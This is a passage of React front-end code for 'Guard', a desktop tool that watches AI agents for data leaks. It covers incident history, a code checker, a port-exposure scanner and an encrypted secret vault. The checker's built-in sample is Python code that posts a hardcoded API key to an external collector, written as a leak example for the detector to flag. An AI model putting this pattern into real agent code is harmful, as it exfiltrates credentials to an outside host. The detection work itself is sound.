          ? (currentLang === "ru" ? "⛔ Заблокировать" : "⛔ Block")
          : (currentLang === "ru" ? "Заблокировать и изолировать" : "Block & quarantine"))),
        h("button", {
          className: "yg-btn ghost", disabled: !!busy, onClick: function () { choose("allow"); }
        }, busy === "allow" ? "…" : (currentLang === "ru" ? "Разрешить один раз" : "Allow once")),
        note ? h("span", { className: "yg-note" }, note) : null) : null
    );
  }

  function LivePanel(p) {
    const data = p.data;
    const [q, setQ] = useState("");
    const [filter, setFilter] = useState("all");
    const [histBusy, setHistBusy] = useState("");

    useEffect(function () {
      loadDynamicSessionTitles();
    }, []);
    if (!data) return h(Card, { title: "live protection", className: "wide" }, h(Empty, { text: "loading…" }));
    if (data.status === "error") return h(Card, { title: "live protection", className: "wide" },
      h("div", { className: "yg-err" }, "● " + data.message));

    function delIncident(id) {
      if (!window.confirm(currentLang === "ru" ? ("Удалить инцидент " + id + " из истории? Это нельзя отменить.") : ("Delete incident " + id + " from history?"))) return;
      setHistBusy(id);
      post("/incidents/delete", { incident: id }).then(function (r) {
        setHistBusy("");
        if (r.status === "ok" && p.onChanged) p.onChanged();
        else if (r.status !== "ok") window.alert(r.message || "Failed to delete incident.");
      }).catch(function () { setHistBusy(""); window.alert("Could not reach Guard backend."); });
    }

    function clearHistory() {
      if (!window.confirm(currentLang === "ru" ? "Очистить всю решённую историю инцидентов? Ожидающие решения останутся." : "Clear all resolved incident history?")) return;
      setHistBusy("__all__");
      post("/incidents/clear", { scope: "resolved" }).then(function (r) {
        setHistBusy("");
        if (r.status === "ok" && p.onChanged) p.onChanged();
        else if (r.status !== "ok") window.alert(r.message || "Failed to clear history.");
      }).catch(function () { setHistBusy(""); window.alert("Could not reach Guard backend."); });
    }

    const items = data.items || [];
    const pending = items.filter(function (i) { return i.status === "pending"; });
    const done = items.filter(function (i) { return i.status !== "pending"; })
      .filter(function (inc) {
        if (filter === "blocked" && inc.status !== "quarantined" && inc.status !== "blocked") return false;
        if (filter === "allowed" && inc.status !== "allowed" && inc.status !== "protected") return false;
        if (!q) return true;
        const hay = (inc.id + " " + (inc.tool || "") + " " + (inc.destination || "") + " " +
          (inc.findings || []).map(function (f) { return f.label || ""; }).join(" ")).toLowerCase();
        return hay.indexOf(q.toLowerCase()) !== -1;
      });

    const FILTERS = [["all", currentLang === "ru" ? "Все" : "All"],
                     ["blocked", currentLang === "ru" ? "Заблокировано" : "Blocked"],
                     ["allowed", currentLang === "ru" ? "Разрешено" : "Allowed"]];

    return h(React.Fragment, null,
      h(Card, { title: currentLang === "ru" ? "защита в реальном времени" : "live protection", className: "wide" },
        h(VisualSecurityMap, { data: data, refresh: p.onChanged }),
        // Show pending alert shield if there are pending actions; omit duplicate if none
        pending.length ? h("div", { className: "yg-shield bad" },
          h("span", { className: "yg-big" }, currentLang === "ru" ? ("⛔ " + (pending.length > 1 ? (pending.length + " действия заблокировано") : "1 действие заблокировано")) : ("⛔ " + pending.length + " action" + (pending.length > 1 ? "s" : "") + " blocked")),
          h("span", { className: "yg-dim" }, currentLang === "ru" ? "  Агент пытался отправить важные данные. Решите ниже, что делать." : "  An agent tried to send sensitive data. Decide below what should happen."))
          : null,
        pending.length ? pending.map(function (inc) { return h(IncidentCard, { key: inc.id, inc: inc, onChanged: p.onChanged }); }) : null),

      h(Card, { title: currentLang === "ru" ? "история инцидентов" : "incident history", className: "wide grow" },
        h("div", { className: "yg-hst-tools" },
          h("input", {
            className: "yg-input yg-hst-search",
            placeholder: currentLang === "ru" ? "Поиск по тексту или ID…" : "Search by text or ID…",
            value: q, onChange: function (e) { setQ(e.target.value); }
          }),
          h("div", { className: "yg-kinds", style: { margin: 0 } },
            FILTERS.map(function (f) {
              return h("button", {
                key: f[0], type: "button",
                className: "yg-kind" + (filter === f[0] ? " on" : ""),
                onClick: function () { setFilter(f[0]); }
              }, f[1]);
            })),
          done.length ? h("button", {
            type: "button", className: "yg-btn ghost", disabled: !!histBusy,
            title: currentLang === "ru" ? "Удалить все решённые инциденты" : "Clear resolved history",
            onClick: clearHistory
          }, histBusy === "__all__" ? "…" : (currentLang === "ru" ? "🗑 Очистить историю" : "🗑 Clear history")) : null),
        done.length ? h("div", { className: "yg-list" },
          done.slice(0, 50).map(function (inc) {
            var accSummary = h("summary", { className: "yg-acc-sum" },
              h("span", { className: "yg-acc-id" }, inc.id),
              h("span", { className: "yg-acc-status" }, getStatusText(inc.status)),
              h("span", { className: "yg-dim yg-acc-time" }, fmtTs(inc.at)),
              h("span", { className: "yg-dim yg-acc-how" }, (inc.tool || "") + " → " + (inc.destination || "")),
              h("button", {
                type: "button", className: "yg-btn ghost yg-acc-del", disabled: !!histBusy,
                title: "Delete",
                onClick: function (e) { e.preventDefault(); e.stopPropagation(); delIncident(inc.id); }
              }, histBusy === inc.id ? "…" : "🗑"));
            return h("details", { key: inc.id, className: "yg-acc", open: false }, accSummary,
              h(IncidentCard, { inc: inc, onChanged: p.onChanged, inAccordion: true }));
          }))
          : h(Empty, { text: "No incidents yet." })));
  }

  // =========================================================================
  // TASK 3.3: CODE INSPECTOR (AI Agent Scripts & Commands Audit, no YadroLang)
  // =========================================================================
  const SAMPLE = "import os, requests\n\n# AI agent automated script: process invoice and telemetry\nOPENAI_API_KEY = \"sk-proj-aB9xK1mZ8Qp2wE5rT7yU4iO6pL0sD3fG2hJ1kL4\"\nuser_prompt = \"Process user payment\"\n\n# Leak: transmitting raw secret key to external collector\nres = requests.post(\n    \"https://analytics-collector.external-api.org/telemetry\",\n    headers={\"Authorization\": f\"Bearer {OPENAI_API_KEY}\"},\n    json={\"task\": user_prompt, \"key\": OPENAI_API_KEY}\n)\nprint(\"Telemetry sent:\", res.status_code)\n";

  function CheckPanel() {
    const [code, setCode] = useState(SAMPLE);
    const [title, setTitle] = useState("");
    const [busy, setBusy] = useState(false);
    const [r, setR] = useState(null);
    const [report, setReport] = useState("");

    function analyze() {
      setBusy(true); setReport("");
      post("/analyze", { code: code, title: title })
        .then(setR).catch(function () { setR({ status: "error", message: "Could not reach the Guard backend." }); })
        .finally(function () { setBusy(false); });
    }
    function applyFix() { if (r && r.autofix) { setCode(r.autofix.fixed_code); setR(null); } }
    function openReport() { post("/report", { code: code }).then(function (d) { setReport(d.html || ""); }).catch(function () {}); }

    return h(Card, { title: currentLang === "ru" ? "проверка кода и команд агентов" : "check agent code before it runs", className: "wide" },
      h("div", { className: "yg-dim yg-small" },
        currentLang === "ru"
          ? "Проверка кода, скриптов и команд ИИ-агентов (Python, Bash, JS, конфигурации MCP) перед запуском на утечки секретов и опасные системные вызовы."
          : "Audit AI agent scripts, commands, and pipelines (Python, Bash, JS, MCP calls) for secret leaks and dangerous calls before execution."),
      h("input", {
        className: "yg-input",
        placeholder: currentLang === "ru" ? "Название (необязательно), например: Агент платежей" : "Name (optional), e.g. payment agent",
        value: title, onChange: function (e) { setTitle(e.target.value); }
      }),
      h("textarea", {
        className: "yg-code-in", spellCheck: false,
        placeholder: currentLang === "ru" ? "Вставьте скрипт или команду агента (Python, Bash, JS, JSON)..." : "Paste agent code or script here",
        value: code, onChange: function (e) { setCode(e.target.value); }
      }),
      h("div", { className: "yg-actions" },
        h("button", { className: "yg-btn", disabled: busy || !code.trim(), onClick: analyze },
          busy ? (currentLang === "ru" ? "Проверка…" : "Checking…") : (currentLang === "ru" ? "Проверить код" : "Check code")),
        h("button", { className: "yg-btn ghost", onClick: function () { setCode(SAMPLE); setR(null); } },
          currentLang === "ru" ? "Пример скрипта" : "Load example"),
        r && r.status !== "error" ? h("button", { className: "yg-btn ghost", onClick: openReport },
          currentLang === "ru" ? "Полный отчёт" : "Open full report") : null),
      r ? h(Result, { r: r, onFix: applyFix }) : null,
      report ? h("div", { className: "yg-report" },
        h("div", { className: "yg-actions" },
          h("span", { className: "yg-sub" }, currentLang === "ru" ? "Полный отчёт" : "Full report"),
          h("button", { className: "yg-btn ghost yg-right", onClick: function () { setReport(""); } },
            currentLang === "ru" ? "Закрыть отчёт" : "Close report")),
        h("iframe", { className: "yg-frame", sandbox: "", srcDoc: report, title: "report" })) : null);
  }

  function Result(p) {
    const r = p.r;
    if (r.status === "error") return h("div", { className: "yg-err yg-gap" }, "● " + r.message);
    if (r.status === "ok") return h("div", { className: "yg-gap" },
      h("div", { className: "yg-shield ok" }, h("span", { className: "yg-big" }, "✓ No leaks found"),
        h("span", { className: "yg-dim" }, "  in " + r.lines + " lines")),
      (r.sanitized || []).map(function (s, i) {
        return h("div", { className: "yg-row", key: i }, h(Chip, { label: s.label }),
          h("span", { className: "yg-dim" }, "protected on line " + s.line + " with " + s.wrapper + "()"));
      }), h(Gaps, { gaps: r.known_gaps }));
    const a = r.autofix;
    return h("div", { className: "yg-gap" },
      h("div", { className: "yg-shield bad" }, h("span", { className: "yg-big" }, "⛔ Leak on line " + r.line),
        h("span", { className: "yg-code" }, r.code)),
      h("div", { className: "yg-inc-story" }, r.why),
      h("div", null, (r.labels || []).map(function (l, i) { return h(Chip, { key: i, label: l }); })),
      h("div", { className: "yg-inc-story" },
        (r.sources || []).length ? "The data comes from " : "Sensitive data ",
        (r.sources || []).map(function (s, i) { return h("b", { key: i, className: "yg-mono" }, (i ? ", " : "") + s.name + "() on line " + s.line); }),
        " and leaves through ", h("b", { className: "yg-mono" }, r.sink.name), " (" + r.sink.human + ")."),
      h("div", { className: "yg-sub" }, "How to send it legally"),
      (r.quarantine || []).map(function (q, i) {
        return h("div", { className: "yg-row", key: i }, h("span", { className: "yg-k" }, q.label),
          h("span", null, q.options.length ? q.options.map(function (o) { return o.human + " (" + o.fn + ")"; }).join(" · ")
            : "no allowed protection: this data must not leave the program"));
      }),
      a ? h("div", null, h("div", { className: "yg-sub" }, "Automatic fix"),
        h("div", { className: "yg-diff old" }, "− " + a.before.trim()),
        h("div", { className: "yg-diff new" }, "+ " + a.after.trim()),
        h("div", { className: "yg-actions" },
          a.verified ? h("span", { className: "yg-ok" }, "✓ verified: the fixed code passes the check") :
            h("span", { className: "yg-warn" }, "⚠ needs manual review"),
          h("button", { className: "yg-btn good", disabled: !a.verified, onClick: p.onFix }, "Apply fix to the code above"))) :
        h("div", { className: "yg-dim yg-small" }, "No safe automatic fix for this leak. Use one of the protections above."),
      h(Gaps, { gaps: r.known_gaps }));
  }

  function Gaps(p) {
    if (!p.gaps || !p.gaps.length) return null;
    return h("details", { className: "yg-gaps" }, h("summary", null, "Honest limits of this check"),
      h("ul", null, p.gaps.map(function (g, i) { return h("li", { key: i }, g); })));
  }

  const SEV = { critical: ["Critical", "bad"], high: ["High", "bad"], medium: ["Medium", "warn"], low: ["Low", "ok"], info: ["Safe", "ok"] };
  const REACH = { all_networks: "Open to every network", local_network: "Open to this local network", this_computer: "Only this computer" };

  function ExposurePanel() {
    const [data, setData] = useState(null);
    const [busy, setBusy] = useState(false);
    const [showSafe, setShowSafe] = useState(false);
    function load(force) {
      setBusy(true);
      SDK.fetchJSON(API + "/exposure" + (force ? "?refresh=1" : ""))
        .then(setData).catch(function () { setData({ status: "error", message: "Guard backend is not reachable." }); })
        .finally(function () { setBusy(false); });
    }
    useEffect(function () { load(false); }, []);
    function changed() { load(true); }

    if (!data) return h(Card, { title: "network exposure", className: "wide" }, h(Empty, { text: "Scanning ports… this takes about 10 seconds." }));
    if (data.status === "error") return h(Card, { title: "network exposure", className: "wide" }, h("div", { className: "yg-err" }, "● " + data.message));

    const items = data.listeners || [];
    const risky = items.filter(function (l) { return l.severity !== "info"; });
    const safe = items.filter(function (l) { return l.severity === "info"; });
    const c = data.counts || {};
    const bad = (c.critical || 0) + (c.high || 0);

    return h(React.Fragment, null,
      h(Card, { title: currentLang === "ru" ? "открытые порты" : "network exposure", className: "wide" },
        h("div", { className: "yg-shield " + (bad ? "bad" : "ok") },
          h("span", { className: "yg-big" }, bad ? "⛔ " : "✓ ", T("Exposure score "), data.score, "/100"),
          h("span", { className: "yg-dim" }, "  ", c.critical || 0, T(" critical · "), c.high || 0, T(" high · "),
            c.medium || 0, T(" medium · "), c.low || 0, T(" low"))),
        h("div", { className: "yg-dim yg-small" },
          currentLang === "ru"
            ? "Программы на этом компьютере, принимающие сетевые подключения, и уровень их открытости. Сканирование ничего не меняет в системе."
            : "Programs on this computer that accept network connections, and who can reach them. Nothing is changed by this scan."),
        h("div", { className: "yg-actions" },
          h("button", { className: "yg-btn", disabled: busy, onClick: function () { load(true); } },
            busy ? (currentLang === "ru" ? "Сканирование…" : "Scanning…") : (currentLang === "ru" ? "Проверить снова" : "Check again")),
          h("span", { className: "yg-dim yg-small" },
            (currentLang === "ru" ? "Последняя проверка: " : "Last check ") + ago(data.scanned_at))),
        risky.length ? risky.map(function (l) { return h(PortRow, { key: l.proto + l.port + "/" + l.pid, l: l, onChanged: changed }); })
          : h(Empty, { text: "Nothing risky is open to the network." }),
        h(FixHistory, { stamp: data.scanned_at, onChanged: changed }),
        h("details", { className: "yg-gaps" }, h("summary", null, "Honest limits of this scan"),
          h("ul", null, (data.limits || []).map(function (g, i) { return h("li", { key: i }, g); })))),
      h(Card, { title: "safe listeners", className: "wide" },
        h("button", { className: "yg-btn ghost", onClick: function () { setShowSafe(!showSafe); } },
          (showSafe ? (currentLang === "ru" ? "Скрыть " : "Hide ") : (currentLang === "ru" ? "Показать " : "Show ")) + safe.length + " safe listeners"),
        showSafe ? safe.map(function (l) { return h(PortRow, { key: l.proto + l.port + "/" + l.pid, l: l, compact: true }); }) : null));
  }

  function addrText(l) {
    const a = l.addresses && l.addresses.length ? l.addresses : [l.address];
    return a.map(function (x) { return x === "::" ? "[::]" : x; }).join(" + ");
  }

  function fwText(l) {
    if (l.firewall === "blocked") return "firewall blocks it";
    if (l.firewall === "off") return "firewall is OFF";
    if (l.firewall === "allowed") {
      let t = "firewall lets it in";
      if (l.firewall_scope === "local_subnet") t += " (from your local network only)";
      else if (l.firewall_scope === "custom") t += " (from some addresses)";
      if (l.firewall_rule) t += " (rule " + l.firewall_rule + ")";
      return t;
    }
    return "firewall: not verified";
  }

  function PortActions(p) {
    const l = p.l;
    const [busy, setBusy] = useState("");
    const [msg, setMsg] = useState("");
    function act(action, extra) {
      setBusy(action); setMsg("");
      const body = Object.assign({ action: action, proto: l.proto, port: l.port, pid: l.pid }, extra || {});
      post("/exposure/act", body)
        .then(function (r) {
          if (r.status === "ok") { p.onChanged(); }
          else { setMsg(r.message || "Could not do it."); }
        })
        .catch(function () { setMsg("Could not reach the Guard backend."); })
        .finally(function () { setBusy(""); });
    }
    const btns = [];
    if (l.actions && l.actions.indexOf("block_port") >= 0)
      btns.push(h("button", { key: "bp", className: "yg-btn", disabled: !!busy, onClick: function () { act("block_port"); } }, "Block in firewall"));
    if (l.actions && l.actions.indexOf("unblock") >= 0)
      btns.push(h("button", { key: "ub", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act("unblock"); } }, "Remove firewall block"));
    if (l.actions && l.actions.indexOf("disable_service") >= 0 && l.service_name)
      btns.push(h("button", { key: "ds", className: "yg-btn bad", disabled: !!busy, onClick: function () {
        if (window.confirm(T("Turn off this Windows service? Windows will ask you to confirm. You can undo it here."))) act("disable_service");
      } }, "Turn off this service"));
    if (l.actions && l.actions.indexOf("stop_program") >= 0)
      btns.push(h("button", { key: "sp", className: "yg-btn bad", disabled: !!busy, onClick: function () {
        if (window.confirm(T("Stop this program now? Unsaved work in it may be lost."))) act("stop_program");
      } }, "Stop the program"));
    if (l.settings_page)
      btns.push(h("button", { key: "st", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act("settings", { page: l.settings_page }); } }, "Open Windows Settings"));
    btns.push(h("button", { key: "tr", className: "yg-btn ghost", disabled: !!busy, onClick: function () { act(l.trusted ? "untrust" : "trust"); } },
      l.trusted ? "Stop trusting" : "Mark as trusted"));
    return h("div", { className: "yg-actions" }, btns,
      busy ? h("span", { className: "yg-dim yg-small" }, "Working with Windows…") : null,
      msg ? h("span", { className: "yg-err yg-small" }, msg) : null);
  }

  function FixHistory(p) {
    const [fixes, setFixes] = useState([]);
    const [busy, setBusy] = useState("");
    function load() {
      SDK.fetchJSON(API + "/exposure/fixes")
        .then(function (r) { if (r.status === "ok") setFixes(r.items || []); })
        .catch(function () {});
    }
    useEffect(function () { load(); }, [p.stamp]);
    function undo(fixId) {
      setBusy(fixId);
      post("/exposure/act", { action: "undo", fix: fixId })
        .then(function (r) {
          if (r.status === "ok") { p.onChanged(); load(); }
          else { window.alert(r.message || "Could not undo."); }
        })
        .catch(function () { window.alert("Could not reach the Guard backend."); })
        .finally(function () { setBusy(""); });
    }
    if (!fixes.length) return null;
    return h("div", { className: "yg-gap" },
      h("div", { className: "yg-sub" }, "Changes made by Guard (" + fixes.length + ")"),
      fixes.map(function (f) {
        return h("div", { className: "yg-row", key: f.id },
          h("span", null, T(f.action), ": ", h("b", { className: "yg-mono" }, f.target), " (", ago(f.at), ")"),
          f.undone ? h("span", { className: "yg-dim" }, "undone") :
            h("button", { className: "yg-btn ghost", disabled: busy === f.id, onClick: function () { undo(f.id); } },
              busy === f.id ? "…" : "Undo"));
      }));
  }

  function PortRow(p) {
    const l = p.l, s = SEV[l.severity] || ["?", "warn"];
    return h("div", { className: "yg-inc " + (l.severity === "critical" || l.severity === "high" ? "pending" : "done") },
      h("div", { className: "yg-inc-top" },
        h(Pill, { kind: s[1] }, s[0]),
        h("b", null, l.service),
        h("span", { className: "yg-dim yg-right yg-mono" },
          l.proto + " " + addrText(l), " ", T("port"), " ", l.port)),
      h("div", { className: "yg-inc-story" },
        h("b", { className: "yg-mono" }, l.process), " ", T("(pid"), " ", l.pid, ") · ", T(REACH[l.reach] || l.reach),
        l.reach === "this_computer" ? null : " · " + fwText(l),
        (l.tags || []).indexOf("public-tunnel") >= 0 ? h("span", { className: "yg-err" }, " · public internet tunnel") : null),
      l.trusted ? h("div", { className: "yg-ok yg-small" }, "You marked this as trusted.") : null,
      p.compact ? null : h("div", { className: "yg-dim" }, T(l.why)),
      p.compact || l.fix === "Nothing to do." ? null : h("div", { className: "yg-ok yg-small" }, T("What to do:") + " " + T(l.fix)),
      p.compact ? null : h(PortActions, { l: l, onChanged: p.onChanged }));
  }

  const KINDS = [["Credentials", "Password, API key or token"], ["Financial", "Card or bank account"],
    ["PII", "Personal data (name, phone, email)"], ["Health", "Medical data"], ["Location", "Location data"]];

  // =========================================================================
  // TASK 3.4: VAULT PANEL (Friendly Secret Name & msg_tok_ Tokens)
  // =========================================================================
  function VaultPanel(p) {
    const [title, setTitle] = useState("");
    const [secret, setSecret] = useState("");
    const [label, setLabel] = useState("Credentials");
    const [msg, setMsg] = useState(null);
    const [busy, setBusy] = useState(false);

    function save() {
      setBusy(true); setMsg(null);
      post("/vault", { secret: secret, label: label, title: title })
        .then(function (r) {
          if (r.status === "ok") {
            setSecret(""); setTitle("");
            setMsg({
              ok: true,
              text: currentLang === "ru"
                ? ("Сохранено. Секрету присвоен токен " + (r.token || "").slice(0, 26) + "… вместо реального значения.")
                : (T("Saved. Agents now get the token ") + (r.token || "").slice(0, 26) + T("… instead of the real value, and any attempt to send the real value is blocked."))
            });
            p.onChanged();
          } else setMsg({ ok: false, text: r.message || "Could not save." });
        })
        .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
        .finally(function () { setBusy(false); });
    }

    const items = (p.vault && p.vault.items) || [];
    const live = items.filter(function (v) { return !v.deleted; });
    const trash = items.filter(function (v) { return v.deleted; });

    function op(body, okText) {
      setBusy(true); setMsg(null);
      post("/vault/op", body)
        .then(function (r) {
          setMsg(r.status === "ok" ? { ok: true, text: T(okText) + (r.path ? " " + r.path : "") } : { ok: false, text: r.message || "Could not do it." });
          if (r.status === "ok") p.onChanged();
        })
        .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
        .finally(function () { setBusy(false); });
    }

    function addFile(f) {
      if (!f) return;
      if (f.size > 10 * 1024 * 1024) { setMsg({ ok: false, text: "This file is too large (limit 10 MB)." }); return; }
      const rd = new FileReader();
      rd.onload = function () {
        const s = String(rd.result || ""), data = s.slice(s.indexOf(",") + 1);
        setBusy(true); setMsg(null);
        post("/vault/file", { data: data, filename: f.name, label: label, title: f.name })
          .then(function (r) {
            setMsg(r.status === "ok" ? { ok: true, text: "File encrypted and saved. Agents cannot send its contents." } : { ok: false, text: r.message || "Could not save." });
            if (r.status === "ok") p.onChanged();
          })
          .catch(function () { setMsg({ ok: false, text: "Could not reach the Guard backend." }); })
          .finally(function () { setBusy(false); });
      };
      rd.readAsDataURL(f);
    }

    return h(Card, { title: currentLang === "ru" ? "сейф · ваши секреты, зашифрованы" : "vault · your secrets, encrypted", className: "wide" },
      h("div", { className: "yg-dim yg-small" },
        currentLang === "ru"
          ? "Добавьте секрет, который хотите защитить. Он шифруется механизмом Windows DPAPI и никогда не показывается в открытом виде. Агентам передаётся только токен msg_tok_..."
          : (T("Add a secret you want to protect. It is encrypted with your Windows account ") + T("and never shown again here. Guard blocks any agent that tries to send it."))),
      // Mandatory secret title input
      h("input", {
        className: "yg-input",
        placeholder: currentLang === "ru" ? "Название секрета (например: Ключ OpenAI, Карта Visa, Токен GitHub)" : "Secret name (e.g. OpenAI Key, Visa Card, GitHub Token)",
        value: title, onChange: function (e) { setTitle(e.target.value); }
      }),
      h("input", {
        className: "yg-input", type: "password", autoComplete: "off",
        placeholder: currentLang === "ru" ? "Значение секрета (пароль, токен, приватный ключ)" : "Paste the secret value",
        value: secret, onChange: function (e) { setSecret(e.target.value); }
      }),
      h("div", { className: "yg-kinds", role: "radiogroup", "aria-label": "Kind of secret" },
        KINDS.map(function (k) {
          return h("button", {
            key: k[0], type: "button", role: "radio", "aria-checked": label === k[0],
            className: "yg-kind" + (label === k[0] ? " on" : ""),
            onClick: function () { setLabel(k[0]); }
          }, k[1]);
        })),
      h("div", { className: "yg-actions" },
        h("button", {
          className: "yg-btn", disabled: busy || !secret || !title.trim(),
          onClick: save
        }, busy ? (currentLang === "ru" ? "Шифрование…" : "Encrypting…") : (currentLang === "ru" ? "Защитить этот секрет" : "Protect this secret"))),
      h("div", { className: "yg-actions" },
        h("label", { className: "yg-btn ghost" }, currentLang === "ru" ? "Добавить файл" : "Add a file",
          h("input", { type: "file", style: { display: "none" }, onChange: function (e) { addFile(e.target.files && e.target.files[0]); e.target.value = ""; } })),
        h("span", { className: "yg-dim yg-small" }, "Up to 10 MB: .env, keys, wallet files, documents.")),
      msg ? h("div", { className: msg.ok ? "yg-ok yg-small" : "yg-err yg-small" }, msg.text) : null,
      h("div", { className: "yg-sub" }, (currentLang === "ru" ? "Под защитой: " : "Protected: ") + live.length),
      live.map(function (v) { return h(VaultItem, { key: v.token, v: v, op: op, busy: busy }); }),
      trash.length ? h("details", { className: "yg-gaps" }, h("summary", null, (currentLang === "ru" ? "Корзина (" : "Trash (") + trash.length + ")"),
        h("div", { className: "yg-dim yg-small" }, "Items in the trash are deleted for good after 30 days. While in the trash, agents cannot use them."),
        trash.map(function (v) {
          return h("div", { className: "yg-row", key: v.token },
            h(Chip, { label: { id: v.label, label: v.title || v.filename || v.label } }),
            h("span", { className: "yg-dim yg-small" }, ago(v.deleted)),
            h("button", { className: "yg-btn ghost", disabled: busy, onClick: function () { op({ op: "restore", token: v.token }, "Restored."); } }, "Restore"),
            h("button", {
              className: "yg-btn bad", disabled: busy, onClick: function () {
                if (window.confirm(T("Delete forever? This cannot be undone."))) op({ op: "purge", token: v.token }, "Deleted forever.");
              }
            }, "Delete forever"));
        })) : null);
  }

  function fmtSize(n) { return n >= 1048576 ? (n / 1048576).toFixed(1) + " MB" : n >= 1024 ? Math.round(n / 1024) + " KB" : n + " B"; }

  function VaultItem(p) {
    const v = p.v;
    const [mode, setMode] = useState("");
    const [val, setVal] = useState("");
    const [menuOpen, setMenuOpen] = useState(false);
    const menuRef = useRef(null);
    function done() { setMode(""); setVal(""); setMenuOpen(false); }

    useEffect(function () {
      if (!menuOpen) return;
      function handleClick(e) { if (menuRef.current && !menuRef.current.contains(e.target)) setMenuOpen(false); }
      function handleKey(e) { if (e.key === "Escape") setMenuOpen(false); }
      document.addEventListener("click", handleClick);
      document.addEventListener("keydown", handleKey);
      return function () {
        document.removeEventListener("click", handleClick);
        document.removeEventListener("keydown", handleKey);
      };
    }, [menuOpen]);

    const friendlyName = v.title || v.filename || (v.token ? v.token.slice(0, 16) + "…" : "Секрет");

    return h("div", { className: "yg-inc done" },
      h("div", { className: "yg-inc-top" },
        h(Chip, { label: { id: v.label, label: v.label } }),
        h("b", { style: { color: "#ffd700", fontSize: "12.5px" } }, friendlyName),
        h("span", { className: "yg-dim yg-mono yg-small" }, v.token ? v.token.slice(0, 18) + "…" : ""),
        h("span", { className: "yg-dim yg-small yg-right" }, ago(v.changed || v.created)),
        mode ? null : h("div", { ref: menuRef, className: "yg-vault-menu", style: { position: "relative" } },
          h("button", {
            type: "button", className: "yg-vault-menu-btn", disabled: p.busy,
            title: "Actions", onClick: function () { setMenuOpen(!menuOpen); }
          }, "⋮"),
          h("button", {
            type: "button", className: "yg-vault-menu-btn yg-vault-trash-btn", disabled: p.busy,
            title: v.deleted ? T("Delete forever") : T("Move to trash"),
            onClick: function () {
              if (window.confirm(T(v.deleted ? "Delete forever? This cannot be undone." : "Move to trash? You can restore it later.")))
                p.op({ op: v.deleted ? "purge" : "trash", token: v.token }, v.deleted ? "Deleted forever." : "Moved to the trash.");
            }
          }, "🗑"),
          menuOpen ? h("div", { className: "yg-vault-menu-dropdown", role: "menu" },
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { setVal(v.title || ""); setMode("rename"); }
            }, currentLang === "ru" ? "✏ Переименовать" : "✏ Rename"),
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item",
              onClick: function () { setMode("kind"); }
            }, currentLang === "ru" ? "🏷 Сменить категорию" : "🏷 Change kind"),
            v.kind === "file"
              ? h("button", {
                type: "button", role: "menuitem", className: "yg-vault-menu-item",
                onClick: function () { p.op({ op: "save", token: v.token }, "Saved a copy to Downloads."); done(); }
              }, currentLang === "ru" ? "⬇ Сохранить копию в Загрузки" : "⬇ Save copy to Downloads")
              : h("button", {
                type: "button", role: "menuitem", className: "yg-vault-menu-item",
                onClick: function () { setMode("replace"); }
              }, currentLang === "ru" ? "↻ Заменить значение" : "↻ Replace value"),
            h("button", {
              type: "button", role: "menuitem", className: "yg-vault-menu-item" + (v.deleted ? " bad" : ""),
              onClick: function () {
                if (window.confirm(T(v.deleted ? "Delete forever? This cannot be undone." : "Move to trash? You can restore it later.")))
                  p.op({ op: v.deleted ? "purge" : "trash", token: v.token }, v.deleted ? "Deleted forever." : "Moved to the trash.");
                done();
              }
            }, "🗑 " + T(v.deleted ? "Delete forever" : "Move to trash"))
          ) : null)
      ),
      mode === "rename" ? h("div", { className: "yg-actions" },
        h("input", { className: "yg-input", value: val, placeholder: "New name", onChange: function (e) { setVal(e.target.value); } }),
        h("button", { className: "yg-btn", disabled: p.busy || !val.trim(), onClick: function () { p.op({ op: "rename", token: v.token, title: val }, "Renamed."); done(); } }, "Save"),
        h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null,
      mode === "replace" ? h("div", { className: "yg-actions" },
        h("input", { className: "yg-input", type: "password", autoComplete: "off", value: val, placeholder: "New value", onChange: function (e) { setVal(e.target.value); } }),
        h("button", { className: "yg-btn", disabled: p.busy || !val, onClick: function () { p.op({ op: "replace", token: v.token, secret: val }, "Value replaced. Agents keep the same token."); done(); } }, "Save"),
        h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null,
      mode === "kind" ? h("div", { className: "yg-kinds" },
        KINDS.map(function (k) {
          return h("button", {
            key: k[0], type: "button", className: "yg-kind" + (v.label === k[0] ? " on" : ""),
            onClick: function () { p.op({ op: "relabel", token: v.token, label: k[0] }, "Kind changed."); done(); }
          }, k[1]);
        }), h("button", { className: "yg-btn ghost", onClick: done }, "Cancel")) : null
    );
  }

  // =========================================================================
  // TASK 2: TAB 5 — SETTINGS & MULTI-AGENT HUB
  // =========================================================================
  function SettingsPanel() {
    const [rules, setRules] = useState([]);
    const [busyRule, setBusyRule] = useState("");
    const [action, setAction] = useState("block");
    const [matchType, setMatchType] = useState("domain");
    const [match, setMatch] = useState("");
    const [failClosed, setFailClosed] = useState(true);
    const [notifyEnabled, setNotifyEnabled] = useState(true);
    const [arenaFps, setArenaFps] = useState("full");

    function loadRules() {
      SDK.fetchJSON(API + "/rules")
        .then(function (r) { if (r.status === "ok") setRules(r.items || []); })
        .catch(function () {});
    }

    useEffect(function () {
      loadRules();
      SDK.fetchJSON(API + "/config")
        .then(function (r) {
          if (r.status === "ok" && r.config) {
            if (r.config.arena_mode) setArenaFps(r.config.arena_mode);
            if (r.config.fail_closed !== undefined) setFailClosed(r.config.fail_closed);
            if (r.config.notifications !== undefined) setNotifyEnabled(r.config.notifications);
          }
        }).catch(function () {});
    }, []);

    function addRule() {
      if (!match.trim()) return;
      setBusyRule("add");
      post("/rules", { action: action, match_type: matchType, match: match.trim() })
        .then(function (r) {
          setBusyRule("");
          if (r.status === "ok") { setMatch(""); loadRules(); }
          else window.alert(r.message || "Failed to add rule.");
        })
        .catch(function () { setBusyRule(""); window.alert("Failed to reach Guard backend."); });
    }

    function delRule(id, m) {
      setBusyRule(id || m);
      post("/rules/delete", { id: id, match: m })
        .then(function (r) {
          setBusyRule("");
          if (r.status === "ok") loadRules();
          else window.alert(r.message || "Failed to delete rule.");
        })
        .catch(function () { setBusyRule(""); window.alert("Failed to reach Guard backend."); });
    }

    function toggleFailClosed(val) {
      setFailClosed(val);
      post("/config", { fail_closed: val }).catch(function () {});
    }

    function toggleNotify(val) {
      setNotifyEnabled(val);
